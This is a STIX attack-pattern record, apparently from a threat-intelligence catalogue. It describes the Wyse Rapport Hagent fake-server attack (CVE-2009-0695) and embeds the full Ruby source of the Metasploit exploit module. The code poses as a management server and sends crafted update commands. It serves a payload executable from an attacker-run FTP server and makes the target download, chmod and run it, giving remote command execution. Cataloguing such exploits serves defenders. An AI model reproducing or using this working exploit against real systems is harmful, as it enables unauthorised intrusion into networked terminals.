{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6e6d4544-e1a9-498b-bdbf-d4d0e5f86e79",
    "created": "2024-08-14T17:04:56.785349Z",
    "modified": "2024-08-14T17:04:56.785353Z",
    "name": "Wyse Rapport Hagent Fake Hserver Command Execution",
    "description": " This module exploits the Wyse Rapport Hagent service by pretending to be a legitimate server. This process involves starting both HTTP and FTP services on the attacker side, then contacting the Hagent service of the target and indicating that an update is available. The target will then download the payload wrapped in an executable from the FTP service.  'Stance'         => Msf::Exploit::Stance::Aggressive",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/wyse/hagent_untrusted_hsdata.rb",
            "external_id": "hagent_untrusted_hsdata.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-0695"
        },
        {
            "source_name": "reference",
            "url": "http://snosoft.blogspot.com/"
        },
        {
            "source_name": "reference",
            "url": "http://www.theregister.co.uk/2009/07/10/wyse_remote_exploit_bugs/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'timeout'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::FtpServer\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Wyse Rapport Hagent Fake Hserver Command Execution',\n      'Description'    => %q{\n          This module exploits the Wyse Rapport Hagent service by pretending to\n        be a legitimate server. This process involves starting both HTTP and\n        FTP services on the attacker side, then contacting the Hagent service of\n        the target and indicating that an update is available. The target will\n        then download the payload wrapped in an executable from the FTP service.\n      },\n      'Stance'         => Msf::Exploit::Stance::Aggressive,\n      'Author'         => 'kf',\n      'References'     =>\n        [\n          ['CVE', '2009-0695'],\n          ['OSVDB', '55839'],\n          ['US-CERT-VU', '654545'],\n          ['URL', 'http://snosoft.blogspot.com/'],\n          ['URL', 'http://www.theregister.co.uk/2009/07/10/wyse_remote_exploit_bugs/']\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 2048,\n          'BadChars' => '',\n        },\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Platform'       => %w{ win linux },\n      'Targets'        =>\n        [\n          [ 'Windows XPe x86',{'Platform' => 'win',}],\n          [ 'Wyse Linux x86', {'Platform' => 'linux',}],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-07-10'\n    ))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT',    [ true, \"The local port to use for the FTP server\", 21 ]),\n        Opt::RPORT(80),\n      ])\n  end\n\n\n  def exploit\n\n    if(datastore['SRVPORT'].to_i != 21)\n      print_error(\"This exploit requires the FTP service to run on port 21\")\n      return\n    end\n\n    # Connect to the target service\n    print_status(\"Connecting to the target\")\n    connect()\n\n    # Start the FTP service\n    print_status(\"Starting the FTP server\")\n    start_service()\n\n    # Create the executable with our payload\n    print_status(\"Generating the EXE\")\n    @exe_file = generate_payload_exe\n    if target['Platform'] == 'win'\n      maldir      = \"C:\\\\\"  \t\t# Windows\n      malfile     = Rex::Text.rand_text_alphanumeric(rand(8)+4) + \".exe\"\n      co = \"XP\"\n    elsif  target['Platform'] == 'linux'\n      maldir      = \"//tmp//\"\t\t# Linux\n      malfile     = Rex::Text.rand_text_alphanumeric(rand(8)+4) + \".bin\"\n      co = \"LXS\"\n    end\n    @exe_sent = false\n\n    # Start the HTTP service\n    print_status(\"Starting the HTTP service\")\n    wdmserver  = Rex::Socket::TcpServer.create({\n      'Context'   => {\n        'Msf'        => framework,\n        'MsfExploit' => self\n      }\n    })\n\n    # Let this close automatically\n    add_socket(wdmserver)\n\n    wdmserver_port = wdmserver.getsockname[2]\n    print_status(\"Starting the HTTP service on port #{wdmserver_port}\")\n\n\n    fakerapport = Rex::Socket.source_address(rhost)\n    fakemac     = \"00\" + Rex::Text.rand_text(5).unpack(\"H*\")[0]\n    mal = \"&V54&CI=3|MAC=#{fakemac}|IP=#{rhost}MT=3|HS=#{fakerapport}|PO=#{wdmserver_port}|\"\n\n    # FTP Credentials\n    ftpserver = Rex::Socket.source_address(rhost)\n    ftpuser   = Rex::Text.rand_text_alphanumeric(rand(8)+1)\n    ftppass   = Rex::Text.rand_text_alphanumeric(rand(8)+1)\n    ftpport   = 21\n    ftpsecure = '0'\n\n    incr = 10\n    pwn1 =\n      \"&UP0|&SI=1|UR=9\" +\n      \"|CO \\x0f#{co}\\x0f|#{incr}\" +\n      # \"|LU \\x0fRapport is downloading HAgent Upgrade to this terminal\\x0f|#{incr+1}\" +\n      \"|SF \\x0f#{malfile}\\x0f \\x0f#{maldir}#{malfile}\\x0f|#{incr+1}\"\n\n    pwn2 = \"|EX \\x0f//bin//chmod\\xfc+x\\xfc//tmp//#{malfile}\\x0f|#{incr+1}\"\n\n    pwn3 =\n      \"|EX \\x0f#{maldir}#{malfile}\\x0f|#{incr+1}\" +\n      # \"|RB|#{incr+1}\" +\n      # \"|SV* \\x0fHKEY_LOCAL_MACHINE\\\\Software\\\\Rapport\\\\pwnt\\x0f 31337\\x0f\\x0f REG_DWORD\\x0f|#{incr+1}\" +\n      #\"|DF \\x0f#{maldir}#{malfile}\\x0f|#{incr+1}\" +\n      # FTP Paramaters\n      \"|&FTPS=#{ftpserver}\" + \"|&FTPU=#{ftpuser}\" + \"|&FTPP=#{ftppass}\" + \"|&FTPBw=10240\" + \"|&FTPST=200\" +\n        \"|&FTPPortNumber=#{ftpport}\" + \"|&FTPSecure=#{ftpsecure}\" +\n      \"|&M_FTPS=#{ftpserver}\" + \"|&M_FTPU=#{ftpuser}\" + \"|&M_FTPP=#{ftppass}\" + \"|&M_FTPBw=10240\" +\n        \"|&M_FTPST=200\" + \"|&M_FTPPortNumber=#{ftpport}\" + \"|&M_FTPSecure=#{ftpsecure}\" +\n      # No clue\n      \"|&DP=1|&IT=3600|&CID=7|QUB=3|QUT=120|CU=1|\"\n\n    if target['Platform'] == 'win'\n      pwn = pwn1 + pwn3\n    elsif target['Platform'] == 'linux'\n      pwn = pwn1 + pwn2 + pwn3\n    end\n    # Send the malicious request\n    sock.put(mal)\n\n    # Download some response data\n    resp = sock.get_once(-1, 10)\n    print_status(\"Received: #{resp}\")\n\n    if not resp\n      print_error(\"No reply from the target, this may not be a vulnerable system\")\n      return\n    end\n\n    print_status(\"Waiting on a connection to the HTTP service\")\n    begin\n      Timeout.timeout(190) do\n        done = false\n        while (not done and session = wdmserver.accept)\n          req = session.recvfrom(2000)[0]\n          next if not req\n          next if req.empty?\n          print_status(\"HTTP Request: #{req.split(\"\\n\")[0].strip}\")\n\n          case req\n          when /V01/\n            print_status(\"++ connected (#{session.peerhost}), \" + \"sending payload (#{pwn.size} bytes)\")\n            res = pwn\n          when /V02/\n            print_status(\"++ device sending V02 query...\")\n            res  = \"&00|Existing Client With No Pending Updates|&IT=10|&CID=7|QUB=3|QUT=120|CU=1|\"\n            done = true\n\n          when /V55/\n            print_status(\"++ device sending V55 query...\")\n            res = pwn\n          when /POST/  # PUT is used for non encrypted requests.\n            print_status(\"++ device sending V55 query...\")\n            res = pwn\n            done = true\n          else\n            print_status(\"+++ sending generic response...\")\n            res = pwn\n          end\n\n          print_status(\"Sending reply: #{res}\")\n          session.put(res)\n          session.close\n        end\n      end\n    rescue ::Timeout::Error\n      print_status(\"Timed out waiting on the HTTP request\")\n      wdmserver.close\n      disconnect\n      return\n    end\n\n    print_status(\"Waiting on the FTP request...\")\n    stime = Time.now.to_f\n    while(not @exe_sent)\n      break if (stime + 90 < Time.now.to_f)\n      select(nil, nil, nil, 0.25)\n    end\n\n    if(not @exe_sent)\n      print_status(\"No executable sent :(\")\n    end\n\n    wdmserver.close()\n\n    handler\n    disconnect\n  end\n\n  def on_client_command_retr(c,arg)\n    print_status(\"#{@state[c][:name]} FTP download request for #{arg}\")\n    conn = establish_data_connection(c)\n    if(not conn)\n      c.put(\"425 Can't build data connection\\r\\n\")\n      return\n    end\n\n    c.put(\"150 Opening BINARY mode data connection for #{arg}\\r\\n\")\n    conn.put(@exe_file)\n    c.put(\"226 Transfer complete.\\r\\n\")\n    conn.close\n    @exe_sent = true\n  end\n\n  def on_client_command_size(c,arg)\n    print_status(\"#{@state[c][:name]} FTP size request for #{arg}\")\n    c.put(\"213 #{@exe_file.length}\\r\\n\")\n  end\n\n\nend\n",
    "x_mitre_disclosure_date": "2009-07-10",
    "x_mitre_platforms": [
        "%w{ win linux }"
    ]
}